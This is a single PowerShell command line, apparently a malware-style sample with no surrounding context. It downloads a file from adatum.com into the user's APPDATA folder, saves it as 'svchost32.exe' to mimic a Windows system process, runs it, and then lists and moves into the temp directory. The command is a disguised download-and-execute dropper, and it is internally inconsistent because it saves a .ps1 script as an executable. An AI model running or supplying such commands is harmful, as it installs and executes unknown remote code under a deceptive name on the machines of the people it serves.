
$DownloadUrl = "https://adatum.com/updater.ps1"; $LocalPath = "$env:APPDATA\svchost32.exe"; Start-BitsTransfer -Source $DownloadUrl -Destination $LocalPath; & $LocalPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Set-Location -Path $env:TEMP
